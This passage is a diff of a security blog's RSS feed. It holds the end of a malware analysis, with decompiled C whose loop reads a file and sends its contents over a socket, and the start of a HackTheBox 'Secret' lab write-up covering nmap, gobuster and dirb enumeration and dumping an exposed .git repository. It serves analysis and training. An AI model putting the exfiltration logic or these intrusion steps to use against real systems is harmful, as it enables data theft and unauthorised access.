+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v14; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+30h] [ebp-40h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v15; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+34h] [ebp-3Ch]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  size_t v16; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+38h] [ebp-38h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v17; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+3Ch] [ebp-34h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v18; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+40h] [ebp-30h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  DWORD NumberOfBytesRead; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+68h] [ebp-8h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)sub_401BC5(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFFF&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v0; ; v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i )
+  {
+    memset(v0, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFFFu&lt;/span&gt;);
+    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ReadFile(hObject, v0, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFFFu&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;NumberOfBytesRead, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(_BYTE)result &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;NumberOfBytesRead )
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+    qmemcpy(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v8, (&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)sub_4014F5(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v18), &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
+    v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v16;
+    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v16 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;;
+    buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)sub_401BC5(v16 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;);
+    memset(buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, v2);
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v8;
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v9;
+    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
+    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v17;
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v10;
+    v3[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v11;
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v12;
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v13;
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v14;
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v15;
+    memmove(buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;, v4, v1);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( send(s, buf, v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; closesocket(s);
+    sub_401BC0(buf);
+    Sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xAu&lt;/span&gt;);
+  }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It is roughly equivalent to:&lt;/p&gt;</content>
+    </item>
+    
     <item>
       <title>HackTheBox: Secret</title>
       <link>https://legiahuyy.github.io/blog/en/posts/htb-secret/</link>
       <pubDate>Thu, 13 Jan 2022 09:30:00 +1345</pubDate>
       
       <guid>https://legiahuyy.github.io/blog/en/posts/htb-secret/</guid>
-      <description>It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret
+      <description>It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret.
 Enumeration Network scan As usual, nmap should provide us an elaborated report on the target&amp;rsquo;s network.
 ┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret] └─$ nmap -sV -sC 10.10.11.120 -v -oA ./nmap/Secret ┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret] └─$ cat ./nmap/Secret.nmap # Nmap 7.92 scan initiated Wed Jan 12 21:44:12 2022 as: nmap -sV -sC -v -oA .</description>
-      <content>&lt;p&gt;It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret&lt;/p&gt;
+      <content>&lt;p&gt;It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret.&lt;/p&gt;
 &lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
 &lt;h3 id=&#34;network-scan&#34;&gt;Network scan&lt;/h3&gt;
 &lt;p&gt;As usual, &lt;code&gt;nmap&lt;/code&gt; should provide us an elaborated report on the target&amp;rsquo;s network.&lt;/p&gt;
@@ -52,9 +299,736 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Based on the output from NMAP, the web-server and a NodeJS service is running on port &lt;code&gt;80&lt;/code&gt; and &lt;code&gt;3000&lt;/code&gt;, respectively. There is also a SSH listening on port &lt;code&gt;22&lt;/code&gt;, however, it is not exploitable even in these easy-rated machines, at least from my own experience. So, let us pay our attention to the former two.&lt;/p&gt;
 &lt;h3 id=&#34;web-server&#34;&gt;Web-server&lt;/h3&gt;
+&lt;p&gt;Visiting either &lt;code&gt;10.10.11.120:80&lt;/code&gt; or &lt;code&gt;10.10.11.120:3000&lt;/code&gt; does provide you with the same webpage.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;D:%5CDevelopment%5Cgithub%5Crepos%5Cimage-host%5C2022-01-13-HTB-Secret%5Csecret1.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;You can see why this box is rated easy since it presumably enables us to download its source code. Beside that and the &lt;strong&gt;Live Demo&lt;/strong&gt; feature, there are no other feasible or potential vectors around but some protracted documentation.&lt;/p&gt;
-&lt;p&gt;g&lt;/p&gt;
+&lt;p&gt;You can see why this box is rated easy since it presumably enables us to download its source code in the last section. Beside that and the &lt;strong&gt;Live Demo&lt;/strong&gt; feature, there are no other feasible or potential vectors around but some protracted documentation.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Live Demo&lt;/strong&gt; redirects us to a assumed API endpoint running on the server.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-14_08-08.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Normally, we would use auxiliaries to enumerate the endpoint, and &lt;code&gt;dirb&lt;/code&gt;, &lt;code&gt;gobuster&lt;/code&gt; are my favorites. There is, nevertheless, a trivial problem that when using &lt;code&gt;gobuster&lt;/code&gt;, you will probably encounter the following error.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ gobuster dir -q -u http://10.10.11.120/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,txt,html -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; -o gobuster.txt
+Error: the server returns a status code that matches the provided options &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; non existing urls. http://10.10.11.120/api/767c3163-5f9d-4235-b2ec-3c8766da50ab &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Length: 93&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. To &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt; please exclude the status code, the length or use the --wildcard switch
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This happens due to the web-server is prone to be configurated to always response with &lt;code&gt;200 OK&lt;/code&gt; code. You can verify this again by sending a &lt;code&gt;CURL&lt;/code&gt; request to a non-existing page.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-14_08-50.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;On that account, we have to exclude &lt;code&gt;200 OK&lt;/code&gt; responses and, hence, our command should look like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ gobuster dir -q -u http://10.10.11.120/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;200&amp;#34;&lt;/span&gt; -x php,bak,txt,html -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; -o gobuster.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;On the other side, &lt;code&gt;dirb&lt;/code&gt; works like a charm.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ dirb http://10.10.11.120/api/ /usr/share/wordlists/dirb/common.txt
+
+...
+-----------------
+
+GENERATED WORDS: &lt;span style=&#34;color:#ae81ff&#34;&gt;4612&lt;/span&gt;                                                  
+
+---- Scanning URL: http://10.10.11.120/api/ ----
++ http://10.10.11.120/api/logs &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;CODE:401|SIZE:13&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                      
++ http://10.10.11.120/api/Logs &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;CODE:401|SIZE:13&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                      
++ http://10.10.11.120/api/priv &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;CODE:401|SIZE:13&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                      
+                                                                       
+-----------------
+END_TIME: Thu Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; 20:28:03 &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt;
+DOWNLOADED: &lt;span style=&#34;color:#ae81ff&#34;&gt;4612&lt;/span&gt; - FOUND: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All these enumerated paths, however, are inaccessible without valid credentials as their responses are &lt;code&gt;401&lt;/code&gt; with an &lt;strong&gt;Access Denied&lt;/strong&gt; message. Despite being restricted, we are able to get the gist of what we should do next.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-15_10-41.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;source-code-analysis&#34;&gt;Source code analysis&lt;/h3&gt;
+&lt;p&gt;In this step, let us have a look at the open-source project provided which can be download at the bottom of the homepage.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ tree ./www/local-web -a -L &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; | tee ./www/local-web/tree.txt 
+./www/local-web
+├── .env
+├── .git
+│   ├── branches
+│   ├── COMMIT_EDITMSG
+│   ├── config
+│   ├── description
+│   ├── HEAD
+│   ├── hooks
+│   ├── index
+│   ├── info
+│   ├── logs
+│   ├── objects
+│   └── refs
+├── index.js
+├── model
+│   └── user.js
+├── node_modules
+...
+├── package.json
+├── package-lock.json
+├── public
+│   ├── assets
+│   └── code
+├── routes
+│   ├── auth.js
+│   ├── forgot.js
+│   ├── private.js
+│   └── verifytoken.js
+├── src
+│   ├── routes
+│   └── views
+├── tree.txt
+└── validations.js
+
+&lt;span style=&#34;color:#ae81ff&#34;&gt;215&lt;/span&gt; directories, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; files
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the source tree, it is clearly a git repository as there is a &lt;code&gt;.git&lt;/code&gt; directory and thus, we would like to dump all the content therein using &lt;a href=&#34;https://github.com/internetwache/GitTools&#34;&gt;GitTools&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ git clone --recursive https://github.com/internetwache/GitTools.git .
+
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ ./GitTools/Extractor/extractor.sh 
+&lt;span style=&#34;color:#75715e&#34;&gt;###########&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Extractor is part of https://github.com/internetwache/GitTools&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Developed and maintained by @gehaxelt from @internetwache&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Use at your own risk. Usage might be illegal in certain circumstances. &lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Only for educational purposes!&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;###########&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; USAGE: extractor.sh GIT-DIR DEST-DIR
+
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ ./GitTools/Extractor/extractor.sh ./www/local-web/ ./www/extracted
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Since the tool need time to extract our target&amp;rsquo;s repository, we can inspect other objects to save some time. And as you may or may not have noticed, neither back-end nor front-end is my favorite but fortunately, I can still read JS to some extent as I did some Node projects in the past. It is not necessary to go through every files and objects in the source code but to narrow it down, and in this case, we want to pay our attention to the &lt;code&gt;routes&lt;/code&gt; directory.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;├── routes
+│   ├── auth.js
+│   ├── forgot.js
+│   ├── private.js
+│   └── verifytoken.js
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;auth.js&lt;/code&gt;, &lt;code&gt;private.js&lt;/code&gt; and &lt;code&gt;verifytoken.js&lt;/code&gt;, these are undoubtedly sensitive files that often reveal a great variety of attack vectors, even in practical scenarios. In addition, it is also worth mentioning &lt;code&gt;index.js&lt;/code&gt;, this lets us know how the server operates and utilizes its endpoints.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// index.js
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;();
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mongoose&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mongoose&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dotenv&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dotenv&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;privRoute&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./routes/private&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bodyParser&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;body-parser&amp;#39;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;public&amp;#39;&lt;/span&gt;))
+&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/assets&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;__dirname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;public/assets&amp;#39;&lt;/span&gt;))
+&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/download&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;__dirname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;public/source&amp;#39;&lt;/span&gt;))
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;views&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./src/views&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;view engine&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ejs&amp;#39;&lt;/span&gt;)
+
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// import routs 
